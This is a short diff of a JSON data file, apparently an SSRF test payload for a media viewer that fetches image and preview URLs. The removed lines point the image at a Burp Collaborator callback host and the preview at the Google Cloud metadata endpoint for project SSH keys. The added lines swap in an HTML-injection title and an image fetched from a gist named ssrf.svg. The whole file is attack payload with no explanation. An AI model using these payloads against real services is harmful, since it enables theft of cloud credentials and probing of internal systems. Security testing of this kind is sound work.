@@ -1,10 +1,11 @@
 {
   "audio": "",
-  "title": "<h1>Hello</h1>",
-  "image": "https://f0gjqe0fke2oxglexmia6p2gw72yqn.burpcollaborator.net/m.jpeg", 
+  "id":"5",
+  "title": "<h1 class=%27title%27>Testme</h1>",
+  "image": "https://gist.githubusercontent.com/random-robbie/dbc7d80c75af03922df1343c45dfceec/raw/ed20c0ef8017abd60be5a3d151af23a52607466b/ssrf.svg",
   "isStereo": true,
   "isYawOnly": false,
-  "preview": "https://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
+  "preview": "",
   "video": "",
   "pitch": 0,
   "yaw": 1.6
